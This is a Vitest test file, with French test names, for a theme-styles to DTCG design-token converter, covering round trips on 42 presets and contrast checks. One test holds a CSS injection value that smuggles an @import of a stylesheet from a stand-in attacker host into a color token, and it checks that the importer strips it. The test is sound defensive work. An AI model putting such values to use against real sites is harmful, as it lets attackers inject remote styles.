import { describe, expect, it } from 'vitest';
import presets from './__fixtures__/tweakcn-presets.json';
import { DTCG_EXTENSION_KEY, THEME_SCHEMA_VERSION, dtcgToThemeStyles, themeStylesToDtcg } from './dtcg.js';
import { contrastRegressions, defaultThemeStyles, type ThemeStyles } from './theme-styles.js';

const all = Object.entries(presets as unknown as Record<string, ThemeStyles>);

describe('projection DTCG', () => {
  it('forme : groupes, $type, $extensions', () => {
    const t = themeStylesToDtcg(defaultThemeStyles, 'light') as any;
    expect(t.color.primary).toEqual({ $value: 'oklch(0.205 0 0)', $type: 'color' });
    expect(t.font.sans.$type).toBe('fontFamily');
    expect(t.radius.default).toMatchObject({ $type: 'dimension' });
    expect(t.shadow.opacity.$type).toBe('number');
    expect(t.typography['letter-spacing'].$type).toBe('dimension');
    expect(t.$extensions[DTCG_EXTENSION_KEY]).toEqual({ schemaVersion: THEME_SCHEMA_VERSION, mode: 'light' });
    // aucune clé du contrat ne reste « à plat » : chaque jeton a un $value
    const tokens = Object.entries(t).filter(([g]) => !g.startsWith('$')).flatMap(([, m]) => Object.values(m as object));
    expect(tokens.every((x: any) => typeof x.$value === 'string')).toBe(true);
    expect(tokens.length).toBe(Object.keys(defaultThemeStyles.light).length);
  });

  it('aller-retour exact sur les 42 thèmes prédéfinis de Tweakcn', () => {
    expect(all.length).toBe(42);
    for (const [name, styles] of all) {
      const back = dtcgToThemeStyles({ light: themeStylesToDtcg(styles, 'light'), dark: themeStylesToDtcg(styles, 'dark') });
      expect(back.warnings, name).toEqual([]);
      expect(back.styles, name).toEqual(styles);
    }
  });

  it('clés d\'extension futures : conservées (groupe custom)', () => {
    const styles: ThemeStyles = { light: { ...defaultThemeStyles.light, 'brand-accent': 'oklch(0.7 0.1 200)' }, dark: defaultThemeStyles.dark };
    const dtcg = themeStylesToDtcg(styles, 'light') as any;
    expect(dtcg.custom['brand-accent'].$value).toBe('oklch(0.7 0.1 200)');
    const back = dtcgToThemeStyles({ light: dtcg, dark: themeStylesToDtcg(styles, 'dark') });
    expect(back.styles.light['brand-accent']).toBe('oklch(0.7 0.1 200)');
  });

  it('import : jeton numérique accepté, inconnu ignoré avec avertissement', () => {
    const light = themeStylesToDtcg(defaultThemeStyles, 'light') as any;
    light.shadow.opacity = { $value: 0.18, $type: 'number' };
    light.color.nouveau = { $value: 'red', $type: 'color' };
    light.layout = { sidebar: { $value: '16rem' } };
    const r = dtcgToThemeStyles({ light, dark: themeStylesToDtcg(defaultThemeStyles, 'dark') });
    expect(r.styles.light['shadow-opacity']).toBe('0.18');
    expect(r.warnings.some((w) => w.includes('light.layout.sidebar'))).toBe(true);
    expect('nouveau' in r.styles.light).toBe(false);
  });

  it('import : un fichier DTCG venu de l\'extérieur est revérifié (injection retirée)', () => {
    const light = themeStylesToDtcg(defaultThemeStyles, 'light') as any;
    light.color.primary = { $value: 'red; } @import url(https://evil.example/x.css); :root {', $type: 'color' };
    const r = dtcgToThemeStyles({ light, dark: themeStylesToDtcg(defaultThemeStyles, 'dark') });
    expect('primary' in r.styles.light).toBe(false);
    expect(r.warnings.some((w) => w.includes('light.primary') && w.includes('valeur retirée'))).toBe(true);
  });

  it('import : structure inattendue signalée sans lever', () => {
    const r = dtcgToThemeStyles({ light: { color: 'x' } as any, dark: undefined });
    expect(r.warnings.length).toBeGreaterThan(0);
    expect(r.styles.dark).toEqual({});
  });
});

describe('contrastRegressions', () => {
  it('rien si la surcharge ne dégrade pas ; les défauts préexistants ne comptent pas', () => {
    const merged: ThemeStyles = { light: { ...defaultThemeStyles.light, primary: 'oklch(0.3 0.1 250)' }, dark: defaultThemeStyles.dark };
    expect(contrastRegressions(defaultThemeStyles, merged)).toEqual([]);
  });
  it('détecte une nouvelle paire sous AA', () => {
    const merged: ThemeStyles = { light: { ...defaultThemeStyles.light, primary: '#777777', 'primary-foreground': '#888888' }, dark: defaultThemeStyles.dark };
    const r = contrastRegressions(defaultThemeStyles, merged);
    expect(r.map((e) => `${e.mode}:${e.background}`)).toEqual(['light:primary']);
  });
});
